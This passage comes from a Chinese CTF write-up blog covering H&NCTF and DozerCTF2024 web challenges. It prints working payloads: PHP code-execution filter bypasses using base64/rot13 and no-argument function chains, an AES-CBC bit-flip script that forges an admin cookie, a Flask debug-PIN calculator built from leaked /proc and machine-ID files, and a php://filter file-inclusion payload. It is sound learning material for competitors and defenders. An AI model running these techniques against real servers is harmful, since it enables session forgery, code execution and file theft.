<br></code></pre></td></tr></table></figure><p>***分析：***post传入两个值，task正则绕过，flag大小写绕过</p><p>​然后replace，意思就是执行task传入的内容。</p><p>***解题：***首先构造flag，我们随便改个大小写就行，<code>please_give_me_flaG</code>,然后看task，常用的rce函数都被禁用了，我尝试了scandir读取内容失败了，学习了一会，可以先base64加密再解密得到想要的/flag，</p><p>payload:<code>task=var_dump(readfile(base64_decode(&quot;L2ZsYWc=&quot;)))&amp;flag=please_give_me_flaG</code></p><p><img src="/../images/H&amp;NCTF/rce.png" alt="rce"></p><p>也可以用rot-13解密，<code>task=var_dump(readfile(str_rot13(&quot;/synt&quot;)))&amp;flag=please_give_me_flaG</code></p><p>这样也是可以的，可以多尝试看看。（回头看了一下其他师傅的知识点，其实有许多绕过的方法</p><h2 id="flippin"><a class="markdownIt-Anchor" href="#flippin"></a> flipPin</h2><p>***知识点：***提示看hint，可以给到源码，放一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>先审计一下代码</p><p><img src="/../images/H&amp;NCTF/flipPin.png" alt="flipPin"></p><p>是AES-CBC字节反转攻击，</p><p>该方面的信息也是不太懂，搜索了一下内容如下</p><p>Flask在debug模式下会生成一个Debugger PIN，而且如果你多次重启Flask服务，PIN码值不改变。</p><p>通常情况下，对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在**/etc/machine-id<strong>或</strong>/proc/sys/kernel/random/boot_id**，有的系统没有这两个文件，windows的id获取跟linux也不同。<br>对于docker机则读取/proc/self/cgroup：</p><p>也是借用一下师傅的代码吧，我自己也不会写（之后准备系统学一下相关知识</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>url = <span class="hljs-string">&quot;http://hnctf.imxbt.cn:34024/&quot;</span><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><span class="hljs-comment">#源代码给的非管理员用户信息</span><br>res = requests.get(url)<span class="hljs-comment">#发送了一个 GET 请求到目标网站，用于获取一个默认的加密会话。</span><br>c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">&quot;session&quot;</span>]))<br>c[default_session.index(<span class="hljs-string">&quot;0&quot;</span>)] ^= <span class="hljs-number">1</span><span class="hljs-comment">#session从0改为1</span><br>evil = b64encode(c).decode()<br><br>res = requests.get(url+<span class="hljs-string">f&quot;read?filename=/proc/sys/kernel/random/boot_id&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: evil&#125;)<br><span class="hljs-comment">#</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sha1</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctfUser&#x27;</span><span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># 报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;226622582027708&#x27;</span>,<span class="hljs-comment">#  /sys/class/net/eth0/address 16进制转10进制</span><br>    <span class="hljs-comment">#machine_id由两个合并(docker就后两个)：1./proc/sys/kernel/random/boot_id      2./proc/self/cgroup 由于cgroup和mountinfo被禁用,则用/proc/1/cpuset代替读取</span><br>    <span class="hljs-string">&#x27;dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f&#x27;</span>+<span class="hljs-string">&#x27;51b9b7cd533a81e6baec0204f59b346b6558a68bed89cfda595ad4a35cc46a39&#x27;</span><span class="hljs-comment">#  /proc/sys/kernel/random/boot_id + /proc/1/cpuset</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin，在console里面输入pin</p><p><img src="/../images/H&amp;NCTF/console.png" alt="console"></p><p>大部分都是借鉴的，之后会系统的学一下。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DozerCTF2024</title>
    <link href="/2024/04/28/Dozerctf/Dozerctf2024/"/>
    <url>/2024/04/28/Dozerctf/Dozerctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：历时一天，最后拿到了团队第八，以下是团队的wp.</p><h1 id="web-and-misc"><a class="markdownIt-Anchor" href="#web-and-misc"></a> web and misc</h1><h2 id="easy_rce"><a class="markdownIt-Anchor" href="#easy_rce"></a> easy_rce</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment"># 简简单单签个到吧</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;/[0-9]|get_defined_vars|include|readfile|crypt|require|file_get_contents|readgzfile|highlight_file|show|session|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-variable">$poc</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;die!&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;dieeeeeeee&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>真狠啊，上面把能禁的都禁了，要不然还是挺简单了，想到之前ctfshow里面可以用scandir看看有什么的。尝试构造一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>试了一下好像不能用./来找,说一下localeconv()</p><p>localeconv() 函数是一个编程语言函数，返回包含本地数字及货币信息格式的数组。这里可以通过这个函数读取当前目录下的文件名称。</p><p><img src="/../../images/dozerctf2024/rce.png" alt="rce"></p><p>可以知道flag就应该在fllllaaag.php，尝试直接得，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Parse error: syntax error, unexpected &#x27;&#123;&#x27; in /var/www/html/fllllaaag.php on line 3<br></code></pre></td></tr></table></figure><p>哎被禁了。那想想其他方法吧。</p><p>还是队友思路好啊我就是大菜狗，再讲一个函数array_flip()</p><p>array_flip () 函数用来交换数组中元素的键和值。array_flip() 返回一个反转后的 array，例如 array 中的键名变成了值，而 array 中的值成了键名。</p><p>简单的说就是下标和内容颠倒，就这么理解。</p><p>array_rand()</p><p>在不改变数组的基础上，从数组中随机的选取一个或多个元素，比如我们在网页上随机显示不同的广告，或者推荐不同的文章等等</p><p>又因为include那些被禁了，（劳累.jpg，也是靠队友，用file就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))));<br></code></pre></td></tr></table></figure><p><img src="/../../images/dozerctf2024/rce1.png" alt="rce1"></p><h2 id="very_long_access"><a class="markdownIt-Anchor" href="#very_long_access"></a> very_long_access</h2><p>下载下来简要看一下内容吧，问了一下gpt,回答如下：</p><p>这看起来像是一个网络服务器的日志条目。它包括了一个时间戳、用户代理字符串（表明是运行在 Windows 10 上的 Chrome 版本 108.0.0.0 浏览器），以及一个对资源&quot;A&quot;的GET请求，请求的数据大小为34760字节。有什么关于这个日志条目你想要了解或讨论的吗？</p><p>感觉和wireshark的题目有点像，和时间有关系，发现时间并不是按顺序写的，撸个脚本排一下序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取日志文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;very_long_access.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    log_entries = file.readlines()<br><br><span class="hljs-comment"># 将日志条目解析为元组列表，每个元组包含时间戳和原始日志条目</span><br>parsed_entries = []<br><span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> log_entries:<br>    timestamp_string = entry.split(<span class="hljs-string">&quot; - &quot;</span>)[<span class="hljs-number">0</span>]<br>    parsed_entry = (timestamp_string, entry)<br>    parsed_entries.append(parsed_entry)<br><br><span class="hljs-comment"># 按时间先后顺序排序日志条目</span><br>sorted_entries = <span class="hljs-built_in">sorted</span>(parsed_entries, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># 写入排序后的日志条目到新文件中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sorted_access_logs.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> sorted_entries:<br>        file.write(entry[<span class="hljs-number">1</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;日志条目已按时间先后顺序排列并保存到 sorted_access_logs.txt 文件中。&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>排完看后面估计要把get/后面的提出来才能有些头绪，再撸个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开文件 very_long_access.txt 以读取模式</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sorted_access_logs.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 创建一个空列表，用于存储每行的数据</span><br>    lines = []<br>    <span class="hljs-comment"># 逐行读取文件内容</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-comment"># 找到每行中 &quot;GET /&quot; 后面的内容，并添加到列表中</span><br>        start_index = line.find(<span class="hljs-string">&quot;GET /&quot;</span>) + <span class="hljs-number">5</span><br>        end_index = line.find(<span class="hljs-string">&quot; &quot;</span>, start_index)<br>        request = line[start_index:end_index]<br>        lines.append(request)<br><br><span class="hljs-comment"># 将提取到的数据拼接成一行</span><br>get_requests = <span class="hljs-string">&#x27;&#x27;</span>.join(lines)<br><br><span class="hljs-comment"># 将拼接后的数据写入到新的文件 get_requests.txt 中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;get_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(get_requests)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提取并写入完成！&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>ctrl+f搜看看有没有惊喜，确实有</p><p><img src="/../../images/dozerctf2024/access.png" alt="access"></p><h2 id="serialize"><a class="markdownIt-Anchor" href="#serialize"></a> serialize</h2><p>上面一个可以输入，下面一个好像偏rce,尝试输入了一会并没有得到答案。我试了一下robots.txt，出来了一个dozer_f1ag.php,直接开开不了，那就代码审计一下吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html:/tmp&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>]:<span class="hljs-string">&#x27;filters&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;function.php&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;去找fun吧！！！&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ini_set,规定了访问路径在这两个里面。</p><p>给file赋值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">然后检查URL查询字符串（$_GET）中是否设置了<span class="hljs-string">&#x27;function&#x27;</span>参数。如果<span class="hljs-string">&#x27;function&#x27;</span>参数已设置，则将其值赋给变量$func；否则，将字符串<span class="hljs-string">&#x27;filters&#x27;</span>赋给$func。<br></code></pre></td></tr></table></figure><p>call_user_func这个函数前阵子刚碰过，试过几次觉得应该是用extract解决。该函数用于将数组中的键名作为变量名，键值作为变量值，导入到当前符号表中。</p><p>strpos用于检测有没有，有才可以include,应该是用伪协议,覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>可是要有function.php,再改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file=php:<span class="hljs-comment">//filter/function.php/convert.base64-encode/resource=dozer_f1ag.php</span><br></code></pre></td></tr></table></figure><p>最后构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">extract</span>&amp;<span class="hljs-title">file</span>=<span class="hljs-title">php</span>://<span 